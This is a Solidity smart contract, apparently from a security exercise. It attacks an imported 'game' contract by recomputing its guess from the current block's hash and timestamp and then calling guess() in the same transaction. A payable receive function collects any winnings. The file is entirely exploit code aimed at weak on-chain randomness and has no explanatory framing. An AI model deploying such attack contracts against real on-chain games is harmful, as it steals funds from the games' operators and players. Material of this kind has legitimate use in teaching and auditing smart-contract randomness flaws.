//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./game.sol";
contract attack{
    game Game;

    constructor(address gameaddress){
        Game = game(gameaddress);
    }
    function Attack()public {
        uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number),block.timestamp)));
        Game.guess(_guess);
    }

    receive() external payable{}

}